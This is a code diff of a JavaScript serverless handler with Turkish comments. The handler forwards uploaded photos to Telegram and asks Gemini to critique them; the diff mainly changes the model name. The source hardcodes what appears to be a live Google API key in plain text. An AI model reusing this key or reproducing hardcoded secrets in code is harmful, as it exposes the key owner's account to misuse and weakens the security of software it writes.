@@ -13,7 +13,7 @@ export default async function handler(req, res) {
   const GEMINI_KEY = "AIzaSyCBsIjX0gqrK6DNx7tPi8c3_Gy0O03PrtU";
 
   try {
-    // 1. Telegram'a Gönder
+    // 1. Telegram'a Gönder (Kurşun Geçirmez Buffer Yöntemi)
     try {
       const formData = new FormData();
       const mediaGroup = [];
@@ -48,8 +48,8 @@ export default async function handler(req, res) {
       text: "Sana yüklenen bu fotoğrafları ışık, odak, kompozisyon ve estetik açıdan değerlendir. İçlerinden en iyi olanı seç ('En Başarılı Fotoğraf: [Sıra No]' şeklinde belirt) ve neden iyi olduğunu detaylı açıkla. Diğerlerinin zayıf yönlerini dürüstçe anlat."
     });
 
-    // 3. Gemini REST API İsteği
-    const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_KEY}`, {
+    // 3. Gemini REST API İsteği (Güncellenmiş Model: gemini-2.0-flash)
+    const geminiRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
